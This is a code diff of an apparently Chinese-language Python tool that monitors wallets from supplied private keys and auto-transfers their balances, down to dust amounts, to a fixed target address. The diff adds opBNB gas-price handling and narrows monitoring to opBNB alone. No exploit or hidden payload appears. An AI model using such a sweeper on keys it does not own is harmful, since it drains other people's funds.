@@ -1533,7 +1533,11 @@ class AlchemyAPI:
                     }
                 else:
                     print_warning(f"Gas价格为0，使用最小值 {chain_config['name']}")
-                    gas_price = 1000000000  # 1 gwei minimum
+                    # opBNB链使用更低的gas价格
+                    if chain_config['chain_id'] == 204:  # opBNB
+                        gas_price = 1010000  # 0.00101 gwei, 对应opBNB实际gas价格
+                    else:
+                        gas_price = 1000000000  # 1 gwei minimum
                     self.record_success()  # 记录成功
                     return {
                         "gas_price": gas_price,
@@ -1546,8 +1550,11 @@ class AlchemyAPI:
             logging.error(f"获取gas价格失败 {chain_config['name']}: {e}")
             
         # 默认gas价格 - 确保不为零
-        default_gas = 20000000000  # 20 gwei
-        print_warning(f"使用默认gas价格 {chain_config['name']}: {default_gas/1e9:.2f} gwei")
+        if chain_config['chain_id'] == 204:  # opBNB
+            default_gas = 1010000  # 0.00101 gwei, 对应opBNB实际gas价格
+        else:
+            default_gas = 20000000000  # 20 gwei
+        print_warning(f"使用默认gas价格 {chain_config['name']}: {default_gas/1e9:.6f} gwei")
         return {
             "gas_price": default_gas,
             "max_fee": default_gas,
@@ -1659,9 +1666,14 @@ class TransferManager:
                     base_gas_limit = 21000  # 原生代币转账基础gas
             
             # 获取基础gas价格
-            base_gas_price = gas_data.get('gas_price', 20000000000)  # 默认20 gwei
-            if base_gas_price <= 0:
-                base_gas_price = 20000000000  # 如果价格为零，使用20 gwei
+            if chain_config['chain_id'] == 204:  # opBNB
+                base_gas_price = gas_data.get('gas_price', 1010000)  # 默认0.00101 gwei for opBNB
+                if base_gas_price <= 0:
+                    base_gas_price = 1010000  # 如果价格为零，使用0.00101 gwei
+            else:
+                base_gas_price = gas_data.get('gas_price', 20000000000)  # 默认20 gwei
+                if base_gas_price <= 0:
+                    base_gas_price = 20000000000  # 如果价格为零，使用20 gwei
             
             # 🎯 粉尘金额特殊处理：使用合理的低gas价格
             dust_threshold = Web3.to_wei(0.001, 'ether')  # 0.001 ETH以下视为粉尘
@@ -1679,10 +1691,16 @@ class TransferManager:
                         print_info(f"📊 网络基础费用: {base_fee/1e9:.3f} gwei，调整为: {min_gas_price/1e9:.3f} gwei")
                     else:
                         # 如果没有基础费用信息，使用保守的低价格
-                        min_gas_price = max(base_gas_price // 5, 2000000000)  # 最低2 gwei
+                        if chain_config['chain_id'] == 204:  # opBNB
+                            min_gas_price = max(base_gas_price // 5, 505000)  # 最低0.000505 gwei for opBNB
+                        else:
+                            min_gas_price = max(base_gas_price // 5, 2000000000)  # 最低2 gwei
                 except Exception as e:
                     print_warning(f"无法获取基础费用: {e}")
-                    min_gas_price = max(base_gas_price // 5, 2000000000)  # 最低2 gwei
+                    if chain_config['chain_id'] == 204:  # opBNB
+                        min_gas_price = max(base_gas_price // 5, 505000)  # 最低0.000505 gwei for opBNB
+                    else:
+                        min_gas_price = max(base_gas_price // 5, 2000000000)  # 最低2 gwei
                 
                 # 使用最小gas limit
                 min_gas_limit = 21000  # 标准最小
@@ -1725,12 +1743,17 @@ class TransferManager:
                     return 0, 0, 0
             
             # 正常金额处理
-            base_gas_price = max(base_gas_price, 1000000000)  # 至少1 gwei
+            if chain_config['chain_id'] == 204:  # opBNB
+                base_gas_price = max(base_gas_price, 1010000)  # 至少0.00101 gwei for opBNB
+            else:
+                base_gas_price = max(base_gas_price, 1000000000)  # 至少1 gwei
             gas_price_multiplier = 1.2
             if chain_config['chain_id'] in [1, 42161, 10]:  # 主网、Arbitrum、Optimism
                 gas_price_multiplier = 1.0
             elif chain_config['chain_id'] == 324:  # ZKsync Era
                 gas_price_multiplier = 2.0
+            elif chain_config['chain_id'] == 204:  # opBNB
+                gas_price_multiplier = 1.0  # opBNB gas价格本身就很低，不需要额外倍数
             
             gas_price = int(base_gas_price * gas_price_multiplier)
             
@@ -1783,9 +1806,12 @@ class TransferManager:
                 
                 # 修复：如果gas价格为0，使用最小gas价格
                 if gas_price <= 0:
-                    gas_price = 1000000000  # 1 gwei 最小值
+                    if chain_config['chain_id'] == 204:  # opBNB
+                        gas_price = 1010000  # 0.00101 gwei for opBNB
+                    else:
+                        gas_price = 1000000000  # 1 gwei 最小值
                     total_needed = gas_limit * gas_price
-                    print_warning(f"Gas价格异常，使用最小值: {gas_price/1e9:.2f} gwei")
+                    print_warning(f"Gas价格异常，使用最小值: {gas_price/1e9:.6f} gwei")
                 
                 # 🎯 粉尘金额自动重新计算gas参数
                 if balance_wei <= Web3.to_wei(0.001, 'ether'):
@@ -1978,7 +2004,10 @@ class TransferManager:
                         except Exception:
                             min_gas_price = gas_data['gas_price'] // 5
                         
-                        min_gas_price = max(min_gas_price, 1000000000)  # 最低1 gwei
+                        if chain_config['chain_id'] == 204:  # opBNB
+                            min_gas_price = max(min_gas_price, 1010000)  # 最低0.00101 gwei for opBNB
+                        else:
+                            min_gas_price = max(min_gas_price, 1000000000)  # 最低1 gwei
                         min_estimated_cost = min_gas_limit * min_gas_price
                         
                         if native_balance >= min_estimated_cost:
@@ -2035,6 +2064,10 @@ class TransferManager:
                         # ZKsync Era使用传统gas价格，但需要特殊的gas估算
                         transaction_data['gasPrice'] = max(gas_data['gas_price'], 25000000)  # 最少0.025 gwei
                         transaction_data['gas'] = 200000  # ZKsync需要更多gas
+                    elif chain_config['chain_id'] == 204:  # opBNB
+                        # opBNB使用极低的gas价格
+                        transaction_data['gasPrice'] = max(gas_data['gas_price'], 1010000)  # 最少0.00101 gwei
+                        transaction_data['gas'] = 21000  # 标准gas限制
                     elif 'max_fee' in gas_data and chain_config['chain_id'] in [1, 137, 10, 42161]:
                         # EIP-1559支持的链
                         transaction_data['maxFeePerGas'] = gas_data['max_fee']
@@ -2964,19 +2997,9 @@ class MonitoringApp:
                         except Exception as e:
                             logging.error(f"处理私钥失败: {e}")
 
-                    # 创建配置 - 只包含Alchemy稳定支持的主要链
+                    # 创建配置 - 只监控opBNB链
                     working_chains = [
-                        # 主要主网 - Alchemy稳定支持
-                        "ETH_MAINNET", "POLYGON_MAINNET", "ARBITRUM_ONE", 
-                        "OPTIMISM_MAINNET", "BASE_MAINNET", "ARBITRUM_NOVA",
-                        # "ZKSYNC_ERA",  # 暂时移除 - API不稳定
-                        # "POLYGON_ZKEVM",  # 暂时移除 - API不稳定
-                        "AVALANCHE_C", "BSC_MAINNET", 
-                        "BLAST", "LINEA", "SCROLL", "ZORA",
-                        
-                        # 测试网 - 稳定支持
-                        "ETH_SEPOLIA", "POLYGON_AMOY", "ARBITRUM_SEPOLIA", 
-                        "OPTIMISM_SEPOLIA", "BASE_SEPOLIA"
+                        "OPBNB"  # 只保留opBNB链
                     ]
                     
                     chains_config = []
@@ -2987,7 +3010,7 @@ class MonitoringApp:
                                 "name": chain_name,
                                 "chain_id": chain_info['chain_id'],
                                 "recipient_address": TARGET_ADDRESS,
-                                "min_amount": "0"
+                                "min_amount": "0.000001"  # 设置更低的最小金额，确保0.02美金的BNB可以转出
                             })
 
                     self.config = {
